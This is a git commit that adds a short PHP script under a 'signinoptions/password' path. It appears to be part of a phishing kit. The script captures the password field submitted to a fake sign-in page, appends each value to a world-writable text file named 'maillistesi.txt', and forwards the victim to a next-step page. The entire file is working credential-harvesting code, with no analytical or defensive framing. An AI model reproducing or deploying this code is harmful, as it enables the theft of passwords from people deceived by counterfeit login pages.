16fb842e88cc857effd3e852c994572370debb9a
keko01 <hatipyucel@gmail.com>
2021-02-04 17:54:05 +0300

    Add files via upload

---
+++ signinoptions/password/passekle.php
@@ -0,0 +1,35 @@
+<?php  
+header('Content-Type: text/html; charset=utf-8');
+$dosya_adi = "maillistesi.txt"; 
+
+
+$deger = $_POST["Log_Sifre"]; 
+
+$yazilacak_deger = "$deger\n"; 
+
+if ($deger) {  
+
+if (!file_exists($dosya_adi)){  
+   
+touch($dosya_adi); 
+chmod($dosya_adi,0666); 
+   
+} 
+
+$dosyaya_baglanti = fopen($dosya_adi,"a+"); 
+
+if (!fwrite($dosyaya_baglanti,$yazilacak_deger)){ 
+echo "Dosyaya yazılamadı."; 
+exit; 
+
+}  
+
+header("Location: pass2.php");
+
+} else { 
+
+echo "Dosyaya yazılamadı."; 
+
+} 
+
+?>
